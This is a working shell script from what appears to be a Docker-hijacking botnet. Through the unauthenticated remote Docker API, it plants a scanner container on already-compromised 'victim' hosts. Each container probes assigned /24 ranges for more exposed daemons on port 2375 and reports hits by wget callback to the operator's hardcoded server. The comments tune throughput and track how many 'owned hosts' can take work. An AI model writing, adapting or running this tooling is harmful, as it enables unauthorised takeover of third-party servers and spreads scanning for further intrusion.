#!/bin/sh
# ============================================================================
# docknest.sh - turn victims into searchers.
#
# Everything in this fleet scans from box1: one 2-vCPU VPS, ~29 addresses/s, one
# internetdb allowance. A victim holds our container and does nothing else with
# it. This gives every victim that currently holds a RUNNING container a second,
# tiny container whose whole job is to port-check a shard of nets.txt on :2375
# from the victim's own IP - and to report any hit straight back to box1.
#
# Design decisions, all forced by measurement:
#   * report by HTTP callback, not by reading the container. On a real daemon
#     /logs and exec-start both return EMPTY (JSON routes are fine), so scraped
#     output is not dependable. A wget callback is, and doubles as liveness.
#   * busybox + nc, no TLS: plain TCP needs nothing from the userland, so the
#     image is ~2MB. Refining a hit into "is this really a daemon" stays box1's
#     job (it asks /version), so victims stay coarse and cheap.
#   * a cursor walks nets.txt's /24s so no two victims cover the same range and a
#     full pass covers each /24 once. A victim that dies mid-shard loses that
#     range until the cursor comes round - acceptable, and why we do not try to
#     remember per-victim progress.
#   * the docker API does NOT auto-pull on create, so we pull first.
#
# usage: sh docknest.sh            (timer: every 10 min)
# knobs: NEST_PERSHARD /24s per victim, NEST_PAR probes in flight, NEST_MAXHOSTS
# ============================================================================
set -u
SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK" 2>/dev/null || :
IMG="${NEST_IMAGE:-busybox:1.36}"
# MEASURED on the first live round: PAR=24 moved ~3.4 addresses/s per victim, not
# the 24 the timeout implies - so concurrency, not nc's -w, bounds the loop.
# These defaults are what the worker.env comments were written from; keep the two
# files in step or a hunt host that fetched one of them will disagree with box1.
PER="${NEST_PERSHARD:-48}"
PAR="${NEST_PAR:-96}"
MAXH="${NEST_MAXHOSTS:-12}"
CUR="$WORK/nest.cursor"
URLF="$WORK/nest.url"
NETS="$SYSDIR/nets.txt"

[ -s "$NETS" ] || { echo "docknest: no nets.txt at $NETS"; exit 0; }

if [ -n "${NEST_URL:-}" ]; then
    # Pinned on purpose: a nested scanner must call *box1*, and a host running
    # this script is not necessarily box1, so its own public IP is the wrong
    # answer. worker.env carries the pin; detection is only the fallback.
    BASE="$NEST_URL"
    printf '%s\n' "$BASE" > "$URLF"
elif [ -s "$URLF" ]; then
    BASE=$(head -1 "$URLF")
else
    me=$(curl -fsS -m 6 https://api.ipify.org 2>/dev/null) || me=""
    [ -n "$me" ] || me=$(curl -fsS -m 6 http://ifconfig.me/ip 2>/dev/null) || me=""
    [ -n "$me" ] || me="167.233.74.146"
    BASE="http://$me:${NEST_PORT:-8080}"
    printf '%s\n' "$BASE" > "$URLF"
fi

TOK=$(grep -c . "$NETS" 2>/dev/null) || TOK=0
[ "$TOK" -gt 0 ] || { echo "docknest: nets.txt empty"; exit 0; }
TOT=$((TOK * 256))
cur=$(cat "$CUR" 2>/dev/null) || cur=0
case "${cur:-}" in ''|*[!0-9]*) cur=0 ;; esac

echo "docknest: callback $BASE  per=$PER par=$PAR max=$MAXH cursor=$cur/$TOT"

n=0
# Skip reasons are counted, not swallowed. "how many victims can even take a
# shard" is THE number this whole vector scales with, and it was invisible: every
# ineligible host left the loop through a silent `continue`, so a run that handed
# work to 2 of 59 owned hosts looked identical to one where 40 were busy.
sk_dead=0; sk_ours=0; sk_run=0; sk_busy=0
for ip in $(cut -f1 "$WORK/dock.owned" 2>/dev/null | sort -u); do
    [ -n "$ip" ] || continue
    b="http://$ip:2375"
    lst=$(curl -sS -m 5 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    if [ -z "$lst" ]; then sk_dead=$((sk_dead + 1)); continue; fi
    frag=$(printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -i 'kworker' | head -1)
    if [ -z "$frag" ]; then sk_ours=$((sk_ours + 1)); continue; fi
    st=$(printf '%s' "$frag" | grep -o '"State":"[a-z]*"' | head -1 | cut -d'"' -f4)
    if [ "$st" != running ]; then sk_run=$((sk_run + 1)); continue; fi
    if printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -q '"kwscan"'; then
        echo "docknest: $ip already scanning"
        sk_busy=$((sk_busy + 1))
        continue
    fi

    pre=$(awk -v s="$cur" -v pn="$PER" -v f="$NETS" 'BEGIN{
        c=0
        while ((getline l < f) > 0) { sub(/\r$/,"",l); if (l != "") nets[++c]=l }
        for (k=s; k<s+pn; k++) { i=int(k/256)+1; j=k%256; if (i>c) break; printf "%s.%d ", nets[i], j }
    }')
    [ -n "$pre" ] || { echo "docknest: empty shard at cursor $cur"; break; }
    [ "$n" -eq 0 ] && pre="167.233.74 $pre"
    cur=$(( (cur + PER) % TOT ))

    if ! curl -fsS -m 8 "$b/images/$IMG/json" >/dev/null 2>&1; then
        echo "docknest: pulling $IMG on $ip"
        curl -sS -m 240 -X POST "$b/images/create?fromImage=$IMG" >/dev/null 2>&1
    fi

    # the victim's script: expand each /24, nc it, report hits back to box1.
    # no double quotes anywhere, so the JSON needs no escaping on our side.
    # -T 5 on wget matters: busybox wget has NO default timeout, so one slow
    # callback can hang the whole scanner (measured on 134.209.121.89, where a
    # wget callback simply never returned and pinned a probe slot forever).
    V="n=0; for p in $pre; do for i in \$(seq 0 255); do a=\$p.\$i; ( nc -w 1 \$a 2375 </dev/null && wget -qO- -T 5 $BASE/hit?ip=\$a >/dev/null 2>&1 ) & n=\$((n+1)); if [ \$((n%$PAR)) -eq 0 ]; then wait; fi; done; done; wait; echo NEST-DONE"
    BODY="{\"Image\":\"$IMG\",\"Tty\":true,\"Labels\":{\"kwscan\":\"1\"},\"Cmd\":[\"sh\",\"-c\",\"$V\"]}"

    curl -sS -m 10 -X DELETE "$b/containers/kwscan?force=1" >/dev/null 2>&1
    r=$(curl -sS -m 30 -X POST "$b/containers/create?name=kwscan" \
             -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null) || r=""
    cid=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
    [ -n "$cid" ] || { echo "docknest: create failed on $ip: $(printf '%s' "$r" | head -c 90)"; continue; }
    code=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X POST "$b/containers/$cid/start" 2>/dev/null)
    echo "docknest: $ip scanning $(printf '%s' "$pre" | wc -w) /24(s) start=$code next=$cur"
    n=$((n + 1))
    [ "$n" -ge "$MAXH" ] && break
done

printf '%s\n' "$cur" > "$CUR" 2>/dev/null || :
echo "docknest: $n scanning | skipped: dead=$sk_dead no_our_container=$sk_ours not_running=$sk_run busy=$sk_busy | cursor $cur/$TOT"
echo "docknest: capacity = $n of $((n + sk_ours + sk_run)) hosts that answered (dead $sk_dead)"
